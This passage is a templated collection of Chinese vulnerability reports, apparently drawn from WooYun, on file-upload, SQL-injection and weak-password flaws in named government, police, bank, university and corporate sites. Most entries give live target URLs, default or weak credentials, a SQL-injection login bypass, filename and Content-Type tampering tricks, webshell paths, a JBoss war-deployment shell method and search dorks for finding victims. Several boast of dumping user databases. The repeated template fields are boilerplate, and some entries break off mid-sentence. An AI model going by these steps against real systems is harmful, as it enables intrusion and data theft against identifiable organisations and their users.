**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1. 首先是在线直播的后台；比如：工信部的http://zhibo.miit.gov.cn:8080/direct/displayLogin.do这里存在默认口令，admin admin，有的版本没有改；不过要是改了也没有关系；你可以使用经典的  1'or'1'='1 ,用户名和密码都是这就可以登入。进入以后，选择直播管理—点击第一个直播主题“信息化与工业化融合成果展览会”选择“直播管理者”，记录管理者的帐号和密码；先退出。然后以刚才的帐号和密码，选择对应的主题，登录登录进入，选择导播选择“增加图片”，在新窗口中，右键属性，查看添加图片的具体link比如此处的是：http://zhibo.miit.gov.cn:8080/direct/manager/addpicture.jsp?menuid=45在新窗口打开以上连接；另存为本地html文件；打开编辑var str= document.a

**POC**: jsp脚本木马已经上传成功；比如公安部的其他的几个我就不测试了。比如：http://fangtan.sasac.gov.cn/direct/manager/addpicture.jsp?menuid=1

**绕过**: 编码绕过

**修复**: 通过google搜索出来的在线直播的版本是2.0——4.0，只要可以打开的，几乎无一幸免。从代码的角度讲，修补工作太多，我很怀疑航天四创的能力。从用户的角度来说，大家又不是没有钱的单位，这套系统该停就停了吧。（还是录制一个视频好，这个插图太麻烦了。）
---

---
### [wooyun-2013-027739] 某省邮电公司网站存在严重漏洞被国外黑客挂20+黑页(泄露最少2W+用户信息)
**厂商**: 某邮电公司网站 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、网站地址http://www.ahwt.com.cn/2、可以通过webdav写权限直接上传一句话木马3、访问小马网站权限控制的也不好，可以浏览全部盘符4、可以通过phpmyadmin或者菜刀，对数据进行操作，可脱裤。5、网站被挂了20+黑页黑页比较多，就展示这么几个吧。

**POC**: 1、20+黑页

**绕过**: 直接利用

**修复**: 1、禁用一些危险的HTTP方法2、去除一些目录的写权限3、及时打补丁
---

---
### [wooyun-2015-0129805] 某JSP管理网站群管理系统两处任意文件上传漏洞
**厂商**: 安徽汇能信息技术有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 前人好像有提交过这个的： http://**.**.**.**/bugs/wooyun-2014-066332安徽汇能科技信息技术有限公司成立于2004年4月，汇能公司自成立以来,致力于为税务、政府、公安、工商、安全、烟草、院校、企业等部门和行业提供服务，并承接了大量网络工程。在多年的系统集成与软件开发中积累了丰富的经验和雄厚的技术力量。公司目前已取得了ISO9001认证、计算机系统集成三级资质认证、安全技术防范资格证书、软件产品登记证书、软件企业认定证书、办公自动化管理系统证书、无线电通信网络工程设计许可证、高新技术企业认证和校园网工程建设许可证等资质证书。任意文件上传漏洞2处：[构造表单，表单在测试代码]/admin/xtsz/lanmuhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/uploadAct.jsp/main/mo

**POC**: 随机测试了：1、2、

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0107041] 某高校门户信息系统任意文件上传导致代码执行
**厂商**: 南京南软 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 南京南软开发的一套专门用于高校门户信息系统的CMS存在任意文件上传漏洞，可导致上传任意文件。Upload bug:/uploadfile.aspx    此上传漏洞根据Content-type的最后几位来决定后缀名Case:mask 区域1.http://**.**.**/uploadfile.aspx_2.http://**.**.**/uploadfile.aspx_3.http://**.**.**/uploadfile.aspx_4.http://**.**.**/uploadfile.aspx_5.http://**.**.**/uploadfile.aspx

**POC**: 以其中一个作为漏洞的安全测试，该漏洞危害非常巨大，请不要按照方法模仿进行任何恶意入侵行为，否则后果自负！！尝试上传的图片的文件，通过burp截取POST上传的数据包：获取的数据包中将Content-type最后几位修改为你想要上传的任意文件格式：最后将会返回文件名称：返回的目录其实是不正确的，而是在该目录下的bpic目录下：

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-081004] 中演票务通某子站后台文件上传绕过
**厂商**: 中演票务通 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.进后台http://oa.t3.com.cn用户名：zhouyi密码:123456WooYun: 中演票务通某后台弱口令2.1找上传上传点：http://oa.t3.com.cn/Share/OrgUpFile.aspx2.2被黑名单拦截了3.文件名后面带.绕过

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 1.用户密码要加强2.限制系统后台访问IP3.后缀名验证改成白名单
---

---
### [wooyun-2012-06364] 国电某省传输业务监控平台漏洞
**厂商**: 国家电网公司信息安全实验室 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 上传功能, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 涉及杆塔的视频监控和遥感参数，可能涉及生产业务相关，因此没有继续进行测试，已经将此情况通知cncert何工和国家电网公司信息安全实验室王工。主要问题：1、目录遍历；2、后台未授权文件访问；3、文件上传（未测试）；

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-091712] 卖座网一处SQL注射(Http Referer)
**厂商**: maizuo.com | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 上传功能

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: GET /?cityId=13&cityName=%E5%B9%BF%E5%B7%9E HTTP/1.1Host: m.maizuo.comProxy-Connection: keep-aliveAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36Referer: http://m.maizuo.com/city'Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.

**POC**: IP被封，无法深入查询出数据返回200正常返回500错误

**绕过**: 直接利用

**修复**: 补丁
---

---
### [wooyun-2012-05516] 完美时空任意文件上传BUG
**厂商**: 完美时空 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传地址：http://event1.wanmei.com/jsp/playershow/upswf.jsp?siteid=8抓包改包上传。那可以上传任意文件类型文件。但由于服务器执行限制，文件不能执行。但想到了可以上传和执行 shtml 类型，再参考：http://www.htmer.com/article/730.htm可以通过 include：包含某些内容，记得在win环境下可以包含从以获取文件的内容，但在linux下是直接执行。但经测试，好像也是服务器有限制了，不能包含上级目录的文件。大家可以讨论下还有什么可以利用的。。。

**POC**: POST /servlet/upload HTTP/1.1Accept: text/*Content-Type: multipart/form-data; boundary=----------Ij5GI3Ef1gL6ae0Ij5KM7Ij5Ij5cH2User-Agent: Shockwave FlashHost: event1.wanmei.comContent-Length: 440------------Ij5GI3Ef1gL6ae0Ij5KM7Ij5Ij5cH2Content-Disposition: form-data; name="Filename"xxx------------

**绕过**: 直接利用

**修复**: 修一下吧。
---

---
### [wooyun-2012-015142] 威海某事业单位任意文件上传漏洞
**厂商**: 威海物业 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 本来这站不算什么的 但挂有 gov 的名义 必须和谐http://www.whwg.gov.cn/Admin/

**POC**: 直接上传xxoo挂有 gov 的名义 必须和谐

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0111427] 清涧县财政局网站弱口令
**厂商**: 清涧县财政局 | **年份**: 2015 | **类型**: 基础设施弱口令

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 基础设施弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别基础设施弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台万能密码绕过、权限绕过、后台任意文件上传

**POC**: http://www.qjxczj.com/admin/login.php

**绕过**: 过滤绕过

**修复**: 过滤
---

---
### [wooyun-2013-021293] 魅族分站任意文件上传漏洞
**厂商**: 魅族科技 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://developer.meizu.com/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/simpleuploader?Type=ImageFCK本地构造

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 路径好难找
---

---
### [wooyun-2015-098199] 东软高校数字解决方案漏洞集
**厂商**: 东软集团 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 其实，他们的这套系统用户。。 很多，请看图这套系统直接接到学校的核心数据库，如果真的上线，将会集成校园的OA email 短信等各种功能，这套系统的安全性直接关系到了学校的核心。。。。。。。网络中心(默认安装)卸载[学工管理] 学工管理(默认安装)卸载[失物招领] 失物招领(默认安装)卸载[图书系统] 图书系统(默认安装)卸载[毕业设计管理] 毕业设计...(默认安装)卸载[网络教学] 网络教学(默认安装)卸载[教务管理系统] 教务管理...(默认安装)卸载[短信平台] 短信平台(112)卸载[日志] 日志(43)卸载[论坛] 论坛(55)卸载[一卡通系统] 一卡通系统(310)卸载[校历] 校历(190)卸载[通知] 通知(121)卸载[日程] 日程(56)卸载[组织] 组织(61)卸载[分享] 分享(25)卸载[广告申请] 广告申请(22)卸载[EDU邮箱] EDU邮箱(49)卸载[相

**POC**: WooYun: 大红鹰学院高校数字校园解决方案 (上传 csrf xss 文件读取)漏洞集这是上一次的测试内容，因为是拿自己学校测试的，结果老师放假漏洞忽略了。你懂的 真正的漏洞是东软集团。1、上传。 发消息的地方允许上传http://cas.nbdhyu.edu.cn/cas/login?service=http%3A%2F%2Fi.nbdhyu.edu.cn%2Fdcp%2FFileDownLoadloadServlet%3Fmodule%3Dstorage%26sName%3DfileDownload%26upload_path%3Dstorage-path%26folder_id%3D

**绕过**: 直接利用

**修复**: RT
---

---
### [wooyun-2010-0490] sogou过滤不严导致任意上传漏洞
**厂商**: 搜狗 | **年份**: 2010 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 过滤不严导致任意上传漏洞

**POC**: http://fenlei.sogou.com/newhot/admin/upload.jsp

**绕过**: 直接利用

**修复**: 过滤不严导致任意上传漏洞
---

---
### [wooyun-2013-026783] 某OA系统通用jboss文件上传漏洞可影响大量教育机构
**厂商**: 育软 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 还记得我在:WooYun: 中央戏剧学院漏洞合集(目前流行抓明星?)曾经发布过里头的一个jboss，通过后续研究，我发现几乎国内大部分采用该系统的都存在jboss的默认访问配置，当然，可以远程写马了。补一张之前中戏的图在实例中，不少存在jboss默认配置，允许通过远程部署war包进行写马。这种系统存在jboss漏洞大概是95%存在这样问题的有：安徽新华学院oa:http://oa.axhu.cn/jmx-console/安徽工程大学oa:http://edoas.ahpu.edu.cn/jmx-console/泰安市教育局:http://www.taian.edu.cn/jmx-console/

**POC**: jboss拿shell方法如下：页面中搜索“jboss.deployment”，并找到* flavor=URL,type=DeploymentScanner在该页面中去寻找“void addURL()”函数在文本框添加你想添加的war地址即可。部署成功后会给出相应的提示.随便拿一个测试证明确实可以远程写shell:http://edoas.sxufe.edu.cn/cmd/index.jsp漏洞发现方式，主要还是通过搜索引擎，经过研究，发现可以通过如下方式获取这种oa系统：google搜索：intitle:教育电子政务平台或者：inurl:edoas2 都可以搜索到，edoas2其实是这oa里

**绕过**: 直接利用

**修复**: 关闭jboss默认直接访问。或者加设密码。关于jboss安全加固，网上有很多案例，就不多说了。
---

---
### [wooyun-2012-012245] 正宗好凉茶,正宗好声音,中国好声音任意文件上传漏洞
**厂商**: 中国好声音 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 头像上传那里 JS控制格式,用IE或者其他 禁止一下,导致上传附件成功.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: You'll see
---

---
### [wooyun-2016-0172846] 深圳市敏感部门SSL VPN系统存在任意文件上传漏洞
**厂商**: 深圳市公安局 | **年份**: 2016 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 如下三个文件存在漏洞/admin/authentication/trust_ca_import_action.php/admin/authentication/trust_ca_crl_config_action.php/admin/authentication/mini_ca_volume_add_action.php/admin/authentication/trust_ca_import_action.phpif ($_FILES['cert_file']) {$file_size = $_FILES['cert_file']['size'];$file_type = $_FILES['cert_file']['type'];$temp_name = $_FILES['cert_file']['tmp_name'];$file_name = $_FILES['cert_file'][

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤吧
---

---
### [wooyun-2012-011477] 联想的最后一个沦陷站点
**厂商**: 联想 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.老规矩了，是这个站点呢http://ask.lenovomobile.com/联想乐问吧，是咨询关于联想产品问题的地方吧！这次不牛B了。2.我也来问个问题吧，这里只是测试呢！一不小心瞅到有个上传图片的地方呢！have a try！我上传一个正常图片看看先。3.上传test.jpg吧，我最常用的头像，哈哈！点击上传咯4.上传的时候，顺便抓个包看下怎么个上传的，看到filename="test.jpg",这里是不是可以改下呢？5.看下返回的结果吧，可能包含有文件上传后的相对地址哦！果不其然呢！6.访问下这个地址，结果如下：

**POC**: 7.再次上传，不过这个时候要抓包将filename的值test.jpg改成test.php，截图如下：8.再看看返回的地址呗，哎呦我操，服务端真的没做判断呢，后缀还是.php9.啥也不说了，操上菜刀：

**绕过**: 直接利用

**修复**: 1.客户端的过滤判断都是浮云，服务端还是需要做判断的；2.文件名是改成随机命名了，但是后缀也要改下啊；3.建议是将上传的文件存到另一个内网服务器，或者是另一台专门存放静态文件的服务器，这样即使上传成功了php文件，也不能执行了；4.如果是在没有条件的话，建议设置上传文件的目录不可执行权限！5.乐ph
---

---
### [wooyun-2013-038425] 家庭医生# 几百万用户+医生信息泄露
**厂商**: 家庭医生 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 家庭医生www.familydoctor.com.cn  权重PR真高啊  这要是流到黑产  后果严重ok  涉及用户 医生 加起来过百万的信息正题：http://ask.familydoctor.com.cn/upimg.aspx   图片上传使用BURP抓包  直接改  可直接上传aspx马马：http://ask.familydoctor.com.cn/UploadFile/TopicImg/20130928/0928095805104.aspx菜刀连之。上图：涉及多少数据库  多少用户  管理清楚  我也数不过来提权什么就不做了   数据库没有动  管理可查日志ok  谢谢

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 求rank   这个礼物总是可以有的吧？`(*∩_∩*)′
---

---
### [wooyun-2014-062385] 新点网络协同办公系统V7.0任意文件上传
**厂商**: epoint.com.cn | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 介绍可利用搜索引擎查询系统地址百度搜索“新点网络协同办公系统”新点网络协同办公系统V7.0存在任意文件上传漏洞，可以成功上传aspx文件并执行。

**POC**: 演示目标：广西住房和城乡建设厅网--广西建设网系统地址：http://sys67.gxcic.net:8844/oa7/login.aspx利用条件：a)下载系统用户名列表，下载地址为http://sys67.gxcic.net:8844/oa7/ExcelExport/人员列表.xls，规律为http://site/ExcelExport/人员列表.xlsb)尝试密码11111或其他弱口令，新点的系统默认初始口令为11111；本次演示中无需密码尝试，公告中已经给出密码为66666c)登录协同办公系统,如果登录时出现”输入字符串的格式不正确“请使用firefox进行登录；利用工具：菜刀+bur

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-054843] 某政府国土资源局上传漏洞
**厂商**: 某政府国土资源局 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: uploadPic.asp?actionType=mod&picName=miao.asp上传漏洞，任意用户都可以 访问到此文件。任意用户都可以使用此文件上传文件到服务器

**POC**: 大马：http://www.czgtj.gov.cn/inc/top.asp

**绕过**: 直接利用

**修复**: 对访问权限进行限制，上传漏洞处理
---

---
### [wooyun-2014-080935] 协康医药存在FCKeditor文件上传漏洞
**厂商**: 818666.com | **年份**: 2014 | **类型**: 

**元思考**: 触发信号: 上传功能

**洞察**: 防护不足，开发者信任前端输入

**测试流程**:
1. 识别相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 协康医药存在FCKeditor文件上传漏洞，可以上传任意文件，导致存在网站挂马和任意代码执行的风险

**POC**: 见http://www.818666.com/fckeditor/editor/filemanager/browser/default/browser.html?&Connector=../../connectors/asp/connector.asp

**绕过**: 直接利用

**修复**: 增加权限认证
---

---
### [wooyun-2012-04684] 中国银联客服系统任意文件上传
**厂商**: 中国银联 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 同样是用友ICC的问题.https://95516.unionpay.com/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/uploadFlash.php可以直接获取网站管理权限

**POC**: 由于该网站过于敏感.故没有做测试.请自行测试.

**绕过**: 直接利用

**修复**: 找用友升级
---

---
### [wooyun-2014-060593] 搜狐畅游网某分站任意文件上传漏洞
**厂商**: 搜狐畅游 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 搜狐畅游网某分站任意文件上传漏洞

**POC**: 发现搜狐游戏旗下的畅游网的一个分站存在任意文件上传漏洞http://static.wanjiacun.cyou.com/upload.jsp这里可任意文件上传获得WEBSHELL看了下权限很大。可进行搜狐畅游的内网渗透

**绕过**: 直接利用

**修复**: 求礼物 求礼物~~~~~
---

---
### [wooyun-2013-040783] 用友软件某服务器任意文件上传执行导致沦陷
**厂商**: 用友软件 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：http://125.35.5.78:1000/下了个ppt，里面有：上传页面：http://125.35.5.78:1000/test.aspx

**POC**: 老服务器了，不提权了

**绕过**: 直接利用

**修复**: 对上传进行控制
---

---
### [wooyun-2014-061701] 折页网存在任意文件上传漏洞可能影响用户敏感数据
**厂商**: zheye.cc | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 折页网存在任意文件上传漏洞可能影响用户敏感数据1.利用任意文件上传，上传php马；2.发现ThinkPHP,使用mysql数据库；查找config文件，于是数据库账号，邮箱账号泄露；3.登录数据库，可影响用户信息表；

**POC**: 折页网脱裤，用户信息泄露，1.利用任意文件上传，上传php马；2.发现ThinkPHP,使用mysql数据库；查找config文件，于是数据库账号，邮箱账号泄露；3.登录数据库，可影响用户信息表；

**绕过**: 直接利用

**修复**: 你们懂的，裤子啊
---

---
### [wooyun-2015-0117944] 湖北某高速公路建设指挥部存在任意上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 咳咳，在找一些资料的时候看到了xlz0iza1牛的一个通用型0day于是就试了一下wooyun.org/bugs/wooyun-2010-090683http://219.138.90.130:83/OT.OA.WEB/UIFrameWork/login.aspx登录页面漏洞页面为219.138.90.130:83/OT.OA.WEB/OA_Mail/ftb.imagegallery.aspx这个ftb.imagegallery.aspx任意上传的洞当真是极老极老的了此上传需要结合解析漏洞xxx.aspx;.jpg

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-079536] 成都某政府网上传未限制导致可拿
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: URL：http://www.cdjcy.gov.cn/漏洞URL：http://125.71.206.32:8082/WSJB/WSJBApply.aspx?dwbm=510100.Net环境,上传处未限制Ashx和Asmx，后者上传无法运行，提示Asmx脚本只能在本地运行，于是打算先传个Ashx脚本然后在当前目录下生成Aspx文件(目标不能执行Asp文件)，嗦嘎,菜刀连之。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤上传后缀升级服务
---

---
### [wooyun-2013-025925] 北京电信通云主机事业部代理商任意文件上传漏洞,可导致内部/用户敏感信息泄漏
**厂商**: 电信通 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先，IP 118.145.15.66是所有代理商网站所在的服务器，随便查一下。随便找一个进行尝试构建上传代码上传一个ASP文件这是文件地址访问后下载传说中的数据库这是在主站的用户名密码，果断的弱口令啊有木有登录上去，我貌似不小心搞到内部人的号了 - -|||，各种业务都免费哈哈哈。

**POC**: 首先，IP 118.145.15.66是所有代理商网站所在的服务器，随便查一下。随便找一个进行尝试构建上传代码上传一个ASP文件这是文件地址访问后下载传说中的数据库这是在主站的用户名密码，果断的弱口令啊有木有登录上去，我貌似不小心搞到内部人的号了 - -|||，各种业务都免费哈哈哈。

**绕过**: 直接利用

**修复**: 全部代理商网站打补丁，你们比我懂
---

---
### [wooyun-2015-0135700] 上海教育电视台泄漏所有数据服务器被提权进入可控制所有电视数据
**厂商**: 上海教育电视台 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 官方域名 www.setv.sh.cn  IP 101.226.163.131C段查询同服务器域名查询IP 101.226.163.131http://photo.shlll.nethttp://www.shlll.nethttp://wk.shlll.nethttp://renwen.shlll.nethttp://chongming.shlll.nethttp://www.setv.sh.cn  (目标站点)http://hdz.shlll.nethttp://jsmx.shlll.nethttp://jcwg.shlll.nethttp://cmcourse.shlll.nethttp://zzsy.shlll.net----------------------------------主站存在注入 但是权限太小 无法进行下一步渗透 所以我来个注册调转到这个地址http://membe

**POC**: 在注册成功后找到了活动这个连接地址http://act.shlll.net/event/addtopic/AC644B5A6C0FCB1B?t=1发表话题 图片上传burpsuite利用burpsuite截取上传数据burpsuite利用方式就是监听本地127.0.0.1 8080端口浏览器本地改成127.0.0.1 8080端口 代理然后把咱们的APSX直接上传大马图片格式<code>POST /resources/ueditor1_3_6-utf8-net/net/imageUp.ashx HTTP/1.1Accept: */*Accept-Language: zh-CNReferer: 

**绕过**: 直接利用

**修复**: 修复上传脚本 对服务器进行限3389内网访问 禁止代理访问!
---

---
### [wooyun-2014-077465] 某通用气象服务后台存在安全漏洞(任意文件上传可提权/越权访问/弱口令/LED大屏信息修改+电视控制)
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #相关信息:1.事件网址：http://www.artword323.com 技术支持：重庆沃尔德科技有限公司/2.联系人：张小姐电话号码：023-67031381点击通话传真号码：023-67031381官方网站：http://www.wordtech.net详细地址：北部新区海王星科技大厦Ａ区一楼来源:http://www.yjbys.com/company/1229266.html（一）.以其中一个网址为例:渝北区气象为农服务后台管理系统http://ybtv.artword323.com:8012/login.aspx1.弱口令登入:admin/123456后台界面如下:2.任意文件上传并可导致提权服务器:上传点:1.镇街图片管理-修改/Admin/TVDictionary/镇街图片管理Add.aspx?OType=修改&IsD=true&Id=17&ddate=141166413

**POC**: 通用性例子，不再一一提权渗透了:http://[重庆下面县城拼音首位字母]tv.artword323.com:8012/如：开  县http://kxtv.artword323.com:8012/潼  南http://tnantv.artword323.com:8012/渝北区http://ybtv.artword323.com:8012/大  足http://dztv.artword323.com:8012/梁  平http://lptv.artword323.com:8012/酉  阳http://yytv.artword323.com:8012/巫  山http://wstv.artwo

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-022264] 盛大旗下起点小说网任意文件上传导致执行代码
**厂商**: 盛大网络 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://bbs.qidian.com/论坛发帖插图处可利用火狐抓包改包上传木马

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 快修复吧
---

---
### [wooyun-2014-064671] 中国网库文件上传不严谨加目录文件遍历可挂马
**厂商**: 99114.com | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://crm.99114.com/common/jsp/file.jsp看到这个页面能上传然后就试试看了，上传了个小马，结果找不到呀，随手试试，结果...下列目录呀...果断找到了小马...然后balabla...看到了CDEZ盘.... 我发誓只是随便看了看验证了下，然后就删了小马肥家吃饭了..http://crm.99114.com/business/http://crm.99114.com/userfile/attach/http://crm.99114.com/admin/http://crm.99114.com/common/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的..
---

---
### [wooyun-2012-08464] 哇哈哈二级域名有上传漏洞，直接传jsp脚本木马
**厂商**: 哇哈哈官方 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
